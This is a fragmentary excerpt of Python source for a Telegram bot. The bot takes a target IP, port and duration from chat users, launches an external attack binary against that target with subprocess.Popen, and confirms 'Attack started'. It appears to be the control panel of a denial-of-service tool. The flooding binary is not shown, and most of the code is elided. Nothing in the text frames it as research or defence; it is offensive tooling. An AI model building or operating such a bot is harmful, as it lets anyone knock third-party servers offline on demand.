...
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\nNow choose an action:",
...
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        process = subprocess.Popen(
            [BINARY_PATH, target_ip, str(target_port), str(attack_time)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        await update.callback_query.message.reply_text(
            f"Attack started on {target_ip}:{target_port} for {attack_time} seconds!"
        )
...
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    target_ip, target_port, attack_time = None, None, None
